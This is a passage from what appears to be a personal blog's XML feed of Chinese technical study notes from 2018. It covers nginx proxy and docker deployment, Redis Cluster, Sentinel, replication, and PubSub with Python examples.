      <url>/2018/08/26/nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>学习nginx强大的代理功能</p><a id="more"></a><h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><p>正向代理功能挺强大的，具体可以看操作<a href="https://blog.csdn.net/seven_2016/article/details/82085744" target="_blank" rel="noopener">Nginx搭建HTTP正向代理服务器</a></p><p>正向代理有以下几个特征：</p><ul><li>服务端不认识客户端是谁，只认识代理</li><li>客户端知道服务端是谁</li><li>客户端浏览器进行代理设置</li><li>代理好比是客户端的代言人，代表客户端去请求网站是为客户端服务的</li></ul><p>以上客户端和服务端的交互都要通过代理来转发</p><p>主要设置server指令上下文就行了，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server&#123; <span class="comment">#正向代理</span></span><br><span class="line">    resolver 114.114.114.114 8.8.8.8; <span class="comment">#可用的DNS</span></span><br><span class="line">    listen 8081; <span class="comment">#监听的端口</span></span><br><span class="line">    location /&#123;</span><br><span class="line">        proxy_pass http://<span class="variable">$http_host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>最简单的配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    server&#123; </span><br><span class="line">        listen 8082;</span><br><span class="line">        location /&#123;</span><br><span class="line">            proxy_pass http://192.168.88.88:9090;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">```   </span><br><span class="line">但是这样的配置，只要自己配一个nginx和域名代理到其他网站，风险很大，接下来我们看一下反向代理的其他配置</span><br><span class="line"></span><br><span class="line">proxy_set_header用来重定义发往后端服务器的请求头。</span><br><span class="line"></span><br><span class="line">语法格式： </span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    proxy_set_header Field Value;</span><br></pre></td></tr></table></figure></p><p>Value值可以是包含文本、变量或者它们的组合。常见的设置如：<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">proxy_set_header Host <span class="variable">$proxy_host</span>; </span><br><span class="line">proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>; </span><br><span class="line">proxy_set_header X-Forwarded-For <span class="variable">$remote_addr</span>;</span><br></pre></td></tr></table></figure></p><p>注意：在nginx的配置文件中，如果当前模块中没有proxy_set_header的设置，则会从上级别继承配置。继承顺序为：http, server, location。</p><p>一般来说我们会使用nginx内置变量$host来自动获取，当请求端头部有Host值取该值，否则取主域名。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proxy_set_header Host <span class="variable">$host</span>;</span><br></pre></td></tr></table></figure></p><p>把端口加上(非必需)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br></pre></td></tr></table></figure></p><h2 id="代理多网站"><a href="#代理多网站" class="headerlink" title="代理多网站"></a>代理多网站</h2><p>当我们访问<br><a href="http://abc.com:8082/php" target="_blank" rel="noopener">http://abc.com:8082/php</a> 时进入php网站；<br><a href="http://abc.com:8082/python" target="_blank" rel="noopener">http://abc.com:8082/python</a> 时进入java网站.</p><p>简单配置如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    location /php&#123;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>; </span><br><span class="line">        proxy_pass http://192.168.88.88:9090/;</span><br><span class="line">    &#125;</span><br><span class="line">    location /python&#123;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>; </span><br><span class="line">        proxy_pass http://192.168.88.88:8080/;</span><br><span class="line">    &#125;</span><br><span class="line">``` </span><br><span class="line"><span class="comment">## 重写</span></span><br><span class="line"></span><br><span class="line">看我們上面的配置</span><br><span class="line">``` bash</span><br><span class="line">    </span><br><span class="line">    location /php&#123;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>; </span><br><span class="line">        proxy_pass http://192.168.88.88:9090/;  <span class="comment">#为什么这里要加个/</span></span><br><span class="line">    &#125;</span><br><span class="line">```    </span><br><span class="line">/代表根，代理不会把上面的/php带过去，如果去掉/后php网站内置服务器有特殊处理，依然可以访问到。但是java就不行了，除非java代码加入对应的/java @RequestMapping.</span><br><span class="line">其实我们可以使用rewrite来进行重写，格式如下：</span><br><span class="line"></span><br><span class="line">    rewrite 正则 重写的地址 flag</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">    rewrite ^/(.*)$/php/<span class="variable">$1</span> <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">对于示例的讲解就是比如访问的是/<span class="built_in">test</span>/abc，那么/(.*)$就匹配了所有，<span class="variable">$1</span>就是<span class="built_in">test</span>/abc； </span><br><span class="line">如果是^/<span class="built_in">test</span>/(.*)$，那么<span class="variable">$1</span>就是abc。</span><br><span class="line"></span><br><span class="line">flag说明</span><br><span class="line">- last 本条规则匹配完成后，继续向下匹配新的location URL规则</span><br><span class="line">- <span class="built_in">break</span> 本条规则匹配完成则停止，不再匹配后面的任何规则</span><br><span class="line">- redirect 返回302临时重定向，浏览器地址会显示跳转后的URL地址</span><br><span class="line">- permanent 返回301永久重定向，浏览器地址栏会显示跳转后的URL地址</span><br><span class="line"></span><br><span class="line">代理多网站配置重写</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>; </span><br><span class="line">    location /php&#123;</span><br><span class="line">        rewrite /php/(.*)/<span class="variable">$1</span> <span class="built_in">break</span>;</span><br><span class="line">        proxy_pass http://192.168.88.88:9090;</span><br><span class="line">    &#125;</span><br><span class="line">    location /java&#123;</span><br><span class="line">        rewrite /python/(.*)/<span class="variable">$1</span> <span class="built_in">break</span>;</span><br><span class="line">        proxy_pass http://192.168.88.88:8080;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx学习笔记-docker部署Nginx以及常用指令上下文</title>
      <link href="/2018/08/26/nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-docker%E9%83%A8%E7%BD%B2nginx/"/>
      <url>/2018/08/26/nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-docker%E9%83%A8%E7%BD%B2nginx/</url>
      
        <content type="html"><![CDATA[<p>docker部署Nginx以及常用指令上下文</p><a id="more"></a><h1 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h1><ul><li>宿主机环境 ubuntu16</li><li>部署环境 docker 17.12+</li><li>使用的镜像 <a href="https://hub.docker.com/_/Nginx" target="_blank" rel="noopener">https://hub.docker.com/_/Nginx</a> 基于1.15-alpine</li></ul><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="什么是Nginx"><a href="#什么是Nginx" class="headerlink" title="什么是Nginx"></a>什么是Nginx</h2><p>Nginx (engine x) 是一款轻量级的 Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>静态资源服务</li><li>反向代理</li><li>负载均衡</li><li>灰度发布</li></ul><h2 id="涉及到知识点"><a href="#涉及到知识点" class="headerlink" title="涉及到知识点"></a>涉及到知识点</h2><ul><li>Nginx的配置，指令，内置变量学习</li><li>部署案例</li><li>openresty的初步使用</li><li>基于lua嵌入式开发</li></ul><h1 id="部署操作"><a href="#部署操作" class="headerlink" title="部署操作"></a>部署操作</h1><ul><li><p>docker拉取Nginx镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull Nginx:1.15-alpine</span><br></pre></td></tr></table></figure></li><li><p>运行容器</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --name Nginx-test1 -d -p 9090:80 \</span><br><span class="line">Nginx:1.15-alpine</span><br><span class="line">或者</span><br><span class="line">docekr run --name Nginx-test -p 9090:8090 -v /root/myNginx/html:/tmp/html -v /root/myNginx/Nginx.conf:/etc/Nginx/Nginx.conf</span><br></pre></td></tr></table></figure><ul><li>进入到容器</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    docker <span class="built_in">exec</span> -it Nginx-test sh</span><br><span class="line">```   </span><br><span class="line">- 在宿主机中拷贝docker中的Nginx配置文件</span><br><span class="line"></span><br><span class="line">    ctrl+d 退出docker sh</span><br><span class="line">    mkdir myNginx</span><br><span class="line">    docker cp Nginx-test:/etc/Nginx/Nginx.conf myNginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 停止删除容器</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    docker stop Nginx-test &amp;&amp; docker rm Nginx-test</span><br></pre></td></tr></table></figure><h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>具体详解可以看<a href="http://tengine.taobao.org/book/chapter_02.html#id6" target="_blank" rel="noopener">Nginx开发从入门到精通</a>的这一章Nginx文件配置</p><h2 id="指令上下文"><a href="#指令上下文" class="headerlink" title="指令上下文"></a>指令上下文</h2><blockquote><p>Nginx.conf中的配置信息，根据其逻辑上的意义，对它们进行了分类，也就是分成了多个作用域，或者称之为配置指令上下文。不同的作用域含有一个或者多个配置项。<br> 当前Nginx支持的几个指令上下文：</p></blockquote><ul><li>main:    Nginx在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。</li><li>http:    与提供http服务相关的一些配置参数。例如：是否使用keepalive啊，是否使用gzip进行压缩等。</li><li>server:    http服务上支持若干虚拟主机。每个虚拟主机一个对应的server配置项，配置项里面包含该虚拟主机相关的配置。在提供mail服务的代理时，也可以建立若干server.每个server通过监听的地址来区分。</li><li>location:    http服务中，某些特定的URL对应的一系列配置项。</li><li><p>mail:    实现email相关的SMTP/IMAP/POP3代理时，共享的一些配置项（因为可能实现多个代理，工作在多个监听地址上）。</p><p>指令上下文，可能有包含的情况出现。例如：通常http上下文和mail上下文一定是出现在main上下文里的。在一个上下文里，可能包含另外一种类型的上下文多次。例如：如果http服务，支持了多个虚拟主机，那么在http上下文里，就会出现多个server上下文。</p></li></ul><p>因此，我们很简单的通过server指令来配置多个网站</p><h1 id="server指令上下文"><a href="#server指令上下文" class="headerlink" title="server指令上下文"></a>server指令上下文</h1><p>server需要存在于http上下文指令中</p><h2 id="配置一个静态网站"><a href="#配置一个静态网站" class="headerlink" title="配置一个静态网站"></a>配置一个静态网站</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http&#123;   <span class="comment">#用来处理http协议相关</span></span><br><span class="line"></span><br><span class="line">  server&#123;</span><br><span class="line">      listen 80;</span><br><span class="line">      server_name localhost;</span><br><span class="line">      location /&#123;</span><br><span class="line">          root /var/www/html; <span class="comment">#网站目录</span></span><br><span class="line">          index index.html;   <span class="comment">#默认首页</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置多个网站"><a href="#配置多个网站" class="headerlink" title="配置多个网站"></a>配置多个网站</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http&#123;   <span class="comment">#用来处理http协议相关</span></span><br><span class="line">   </span><br><span class="line">     server &#123;</span><br><span class="line">           listen          80;</span><br><span class="line">           server_name     www.linuxidc.com;</span><br><span class="line">           access_log      logs/linuxidc.access.log main;</span><br><span class="line">           location / &#123;</span><br><span class="line">               index index.html;</span><br><span class="line">               root  /var/www/linuxidc.com/htdocs;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       server &#123;</span><br><span class="line">           listen          80;</span><br><span class="line">           server_name     www.Androidj.com;</span><br><span class="line">           access_log      logs/androidj.access.log main;</span><br><span class="line">           location / &#123;</span><br><span class="line">               index index.html;</span><br><span class="line">               root  /var/www/androidj.com/htdocs;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="location指令上下文"><a href="#location指令上下文" class="headerlink" title="location指令上下文"></a>location指令上下文</h1><p>存在于location上下文中的指令如下：</p><ul><li>index</li><li>root</li></ul><p>基本形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location [=!~!~*!^~!/] 你的URL&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>=精确匹配； </li><li>~区分大小写的正则匹配； </li><li>^~同上。^在正则里表示已某字符串开头; </li><li>~*不区分大小写的正则匹配; </li><li>!~和!~* !为取反，不匹配； </li><li>/通用匹配，任何请求都会匹配到; </li><li>@内部跳转用，外部不能访问 </li></ul><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    location ^~ /about/&#123;</span><br><span class="line">        root /var/www/abc;</span><br><span class="line">        index help.html;</span><br><span class="line">    &#125;</span><br><span class="line">```    </span><br><span class="line">这里是以/about/开头的请求，都会匹配上。</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    http://abc.com/about/   这个ok</span><br><span class="line">    http://abc.com/about/abc.html  这也ok，只要你abc.html存在</span><br><span class="line"> ```   </span><br><span class="line"><span class="comment">## 静态资源访问</span></span><br><span class="line"></span><br><span class="line">常用的配置</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    locaction ~* \.(gif|jpg|jpeg|png|js|css)$&#123;</span><br><span class="line">        root /var/www/abc/assets</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis-cluster集群</title>
      <link href="/2018/08/23/Redis-cluster%E9%9B%86%E7%BE%A4/"/>
      <url>/2018/08/23/Redis-cluster%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<p>大数据高并发需求之下的，Redis集群方案了解一下</p><a id="more"></a><p>在大数据高并发场景下，单个 Redis 实例往往会显得捉襟见肘。首先体现在内存上，单个 Redis 的内存不宜过大，内存太大会导致 rdb 文件过大，进一步导致主从同步时全量同步时间过长，在实例重启恢复时也会消耗很长的数据加载时间，特别是在云环境下，单个实例内存往往都是受限的。其次体现在 CPU 的利用率上，单个 Redis 实例只能利用单个核心，这单个核心要完成海量数据的存取和管理工作压力会非常大。</p><p>正是在这样的大数据高并发的需求之下，Redis 集群方案应运而生。它可以将众多小内存的 Redis 实例综合起来，将分布在多台机器上的众多 CPU 核心的计算能力聚集到一起，完成海量数据存储和高并发读写操作。…</p><h1 id="RedisCluster"><a href="#RedisCluster" class="headerlink" title="RedisCluster"></a>RedisCluster</h1><p>RedisCluster是Redis作者自己提供的Redis集群化方案。<br>Redis 集群中内置了 16384 个哈希槽，</p><h2 id="槽位定位算法"><a href="#槽位定位算法" class="headerlink" title="槽位定位算法"></a>槽位定位算法</h2><p>当需要在 Redis 集群中放置一个 key-value时，redis 先对 key 使用 crc16 算法算出一个结果，然后把结果对 16384 求余数，这样每个 key 都会对应一个编号在 0-16383 之间的哈希槽，redis 会根据节点数量大致均等的将哈希槽映射到不同的节点</p><h2 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h2><p>redis cluster 为了保证数据的高可用性，加入了主从模式，一个主节点对应一个或多个从节点，主节点提供数据存取，从节点则是从主节点拉取数据备份，当这个主节点挂掉后，就会有这个从节点选取一个来充当主节点，从而保证集群不会挂掉。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><a href="https://blog.csdn.net/seven_2016/article/details/81986222" target="_blank" rel="noopener">Redis集群 - cluster集群、数据分片</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis哨兵</title>
      <link href="/2018/08/22/Redis%E5%93%A8%E5%85%B5/"/>
      <url>/2018/08/22/Redis%E5%93%A8%E5%85%B5/</url>
      
        <content type="html"><![CDATA[<p>抵抗节点故障的高可用方案</p><a id="more"></a><p>当我们搭建起主从集群的时候，主节点发生故障，需要进行从主切换的时候，Redis为我们提供了一种方案–哨兵（Sentinel）</p><h1 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h1><h2 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h2><p>它负责持续监控主从节点的健康，当主节点挂掉时，自动选择一个最优的从节点切换为主节点。客户端来连接集群时，会首先连接 sentinel，通过 sentinel 来查询主节点的地址，然后再去连接主节点进行数据交互。当主节点发生故障时，客户端会重新向 sentinel 要地址，sentinel 会将最新的主节点地址告诉客户端。如此应用程序将无需重启即可自动完成节点切换。</p><h2 id="消息丢失"><a href="#消息丢失" class="headerlink" title="消息丢失"></a>消息丢失</h2><p>Redis 主从采用异步复制，意味着当主节点挂掉时，从节点可能没有收到全部的同步消息，这部分未同步的消息就丢失了。如果主从延迟特别大，那么丢失的数据就可能会特别多。Sentinel 无法保证消息完全不丢失，但是也尽可能保证消息少丢失。它有两个选项可以限制主从延迟过大。</p><pre><code class="bash">min-slaves-to-write 1min-slaves-max-lag 10</code></pre><p>第一个参数表示主节点必须至少有一个从节点在进行正常复制，否则就停止对外写服务，丧失可用性。</p><p>何为正常复制，何为异常复制？这个就是由第二个参数控制的，它的单位是秒，表示如果 10s 没有收到从节点的反馈，就意味着从节点同步不正常，要么网络断开了，要么一直没有给反馈…</p><h2 id="实例操作"><a href="#实例操作" class="headerlink" title="实例操作"></a>实例操作</h2><p><a href="https://blog.csdn.net/seven_2016/article/details/81952328" target="_blank" rel="noopener">简单主从切换（哨兵模式）</a><br><a href="https://blog.csdn.net/seven_2016/article/details/81952359" target="_blank" rel="noopener">可用的主从切换（哨兵模式）</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Redis主从同步</title>
      <link href="/2018/08/20/Redis%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"/>
      <url>/2018/08/20/Redis%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<p>有备无患的Redis主从同步<br><a id="more"></a></p><p>有了主从，当 master 挂掉的时候，运维让从库过来接管，服务就可以继续，否则 master 需要经过数据恢复和重启的过程，这就可能会拖很长的时间，影响线上业务的持续服务。</p><h1 id="CAP原理"><a href="#CAP原理" class="headerlink" title="CAP原理"></a>CAP原理</h1><p>CAP原理是现代分布式系统的理论基石</p><ul><li>C - Consistent ，一致性</li><li>A - Availability ，可用性</li><li>P - Partition tolerance ，分区容忍性</li></ul><h2 id="网络分区"><a href="#网络分区" class="headerlink" title="网络分区"></a>网络分区</h2><p>分布式系统的节点往往都是分布在不同的机器上进行网络隔离开的，这意味着必然会有网络断开的风险，这个网络断开的场景的专业词汇叫着网络分区</p><h2 id="CAP原理-1"><a href="#CAP原理-1" class="headerlink" title="CAP原理"></a>CAP原理</h2><p>在网络分区发生时，两个分布式节点之间无法进行通信，我们对一个节点进行的修改操作将无法同步到另外一个节点，所以数据的一致性将无法满足，因为两个分布式节点的数据不再保持一致。除非我们牺牲可用性，也就是暂停分布式节点服务，在网络分区发生时，不再提供修改数据的功能，直到网络状况完全恢复正常再继续对外提供服务。<br>CAP的原理就是网络分区发生时，一致性和可用性两难全</p><p>Redis 的主从数据是异步同步的，为了保证最终一致性，从节点会努力追赶主节点，最终从节点的状态会和主节点的状态将保持一致。如果网络断开了，主从节点的数据将会出现大量不一致，一旦网络恢复，从节点会采用多种策略努力追赶上落后的数据，继续尽力保持和主节点一致。</p><h1 id="主从同步方式"><a href="#主从同步方式" class="headerlink" title="主从同步方式"></a>主从同步方式</h1><h2 id="增量同步"><a href="#增量同步" class="headerlink" title="增量同步"></a>增量同步</h2><p>同步的是指令流，主节点会将那些对自己的状态产生修改性影响的指令记录在本地的内存 buffer 中，然后异步将 buffer 中的指令同步到从节点，从节点一边执行同步的指令流来达到和主节点一样的状态，一边向主节点反馈自己同步到哪里了 (偏移量)。<br>因为内存的 buffer 是有限的，所以 Redis 主库不能将所有的指令都记录在内存 buffer 中。Redis 的复制内存 buffer 是一个定长的环形数组，如果数组内容满了，就会从头开始覆盖前面的内容。</p><p>如果因为网络状况不好，主从长时间无法进行同步，那么等buffer中有可能被后续的指令覆盖掉了，从节点将无法直接通过指令流来进行同步。</p><p>注意：当从节点刚刚加入到集群时，它必须先要进行一次快照同步，同步完成后再继续进行增量同步。</p><h2 id="快照同步"><a href="#快照同步" class="headerlink" title="快照同步"></a>快照同步</h2><p>快照同步是一个非常耗费资源的操作，它首先需要在主库上进行一次 bgsave 将当前内存的数据全部快照到磁盘文件中，然后再将快照文件的内容全部传送到从节点。从节点将快照文件接受完毕后，立即执行一次全量加载，加载之前先要将当前内存的数据清空。加载完毕后通知主节点继续进行增量同步。</p><p>在整个快照同步进行的过程中，主节点的复制 buffer 还在不停的往前移动，如果快照同步的时间过长或者复制 buffer 太小，都会导致同步期间的增量指令在复制 buffer 中被覆盖，这样就会导致快照同步完成后无法进行增量复制，然后会再次发起快照同步，如此极有可能会陷入快照同步的死循环。</p><p>Redis 2.8.18 版开始支持无盘复制。所谓无盘复制是指主服务器直接通过套接字将快照内容发送到从节点，生成快照是一个遍历的过程，主节点会一边遍历内存，一边将序列化的内容发送到从节点，从节点还是跟之前一样，先将接收到的内容存储到磁盘文件中，再进行一次性加载</p><h1 id="wait指令"><a href="#wait指令" class="headerlink" title="wait指令"></a>wait指令</h1><p>wait 提供两个参数，第一个参数是从库的数量 N，第二个参数是时间 t，以毫秒为单位。它表示等待 wait 指令之前的所有写操作同步到 N 个从库 (也就是确保 N 个从库的同步没有滞后)，最多等待时间 t。如果时间 t=0，表示无限等待直到 N 个从库同步完成达成一致。</p><p>假设此时出现了网络分区，wait 指令第二个参数时间 t=0，主从同步无法继续进行，wait 指令会永远阻塞，Redis 服务器将丧失可用性。</p><h1 id="实例操作"><a href="#实例操作" class="headerlink" title="实例操作"></a>实例操作</h1><p><a href="https://blog.csdn.net/seven_2016/article/details/81952246" target="_blank" rel="noopener">Redis集群 - 配置最简单的Redis主从读写分离</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis消息多播+PublisherSubscriber</title>
      <link href="/2018/08/20/Redis%E6%B6%88%E6%81%AF%E5%A4%9A%E6%92%AD-PublisherSubscriber/"/>
      <url>/2018/08/20/Redis%E6%B6%88%E6%81%AF%E5%A4%9A%E6%92%AD-PublisherSubscriber/</url>
      
        <content type="html"><![CDATA[<p>几乎没有合适应应用场景的PubSub,了解一下吧</p><a id="more"></a><h1 id="PubSub"><a href="#PubSub" class="headerlink" title="PubSub"></a>PubSub</h1><p>这个模块的名字叫做 PubSub，也就是 PublisherSubscriber，发布者订阅者模型,也就是我们经常碰见的场景，加入群聊之后，就可以收到群聊里面的消息了，消息多播允许生产者生产一次消息，中间件负责将消息复制到多个消息队列，每个消息队列由相应的消费组进行消费。它是分布式系统常用的一种解耦方式，用于将多个消费组的逻辑进行拆分。支持了消息多播，多个消费组的逻辑就可以放到不同的子系统中。</p><h2 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h2><pre><code class="bash"><span class="comment"># -*- coding: utf-8 -*-</span>import timeimport redisclient = redis.StrictRedis()p = client.pubsub()p.subscribe(<span class="string">"sevenshi"</span>)<span class="keyword">while</span> True:    msg = p.get_message()    <span class="keyword">if</span> not msg:        time.sleep(1)        <span class="built_in">continue</span>    <span class="built_in">print</span> msg</code></pre><h3 id="使用listen，更及时获取消息"><a href="#使用listen，更及时获取消息" class="headerlink" title="使用listen，更及时获取消息"></a>使用listen，更及时获取消息</h3><pre><code class="bash"><span class="comment"># -*- coding: utf-8 -*-</span>import timeimport redisclient = redis.StrictRedis()p = client.pubsub()p.subscribe(<span class="string">"sevenshi"</span>)<span class="keyword">for</span> msg <span class="keyword">in</span> p.listen():    <span class="built_in">print</span> msg</code></pre><h3 id="消息结构"><a href="#消息结构" class="headerlink" title="消息结构"></a>消息结构</h3><pre><code>{&apos;pattern&apos;: None, &apos;type&apos;: &apos;subscribe&apos;, &apos;channel&apos;: &apos;codehole&apos;, &apos;data&apos;: 1L}</code></pre><ul><li><p>data 消息的内容，一个字符串。</p></li><li><p>channel 表示当前订阅的主题名称。</p></li><li><p>type 它表示消息的类型，普通的消息，类型就是 message，控制消息，比如订阅指令的反馈，类型就是 subscribe，模式订阅的反馈，它的类型就是 psubscribe，还有取消订阅指令的反馈 unsubscribe 和 punsubscribe。…</p></li><li><p>pattern 它表示当前消息是使用哪种模式订阅到的，如果是通过 subscribe 指令订阅的，那么这个字段就是空。</p></li></ul><h3 id="模式订阅"><a href="#模式订阅" class="headerlink" title="模式订阅"></a>模式订阅</h3><p>上面提到的订阅模式是基于名称订阅的，消费者订阅一个主题是必须明确指定主题的名称。如果我们想要订阅多个主题，可以使用正则进行名称的匹配</p><h2 id="生产者"><a href="#生产者" class="headerlink" 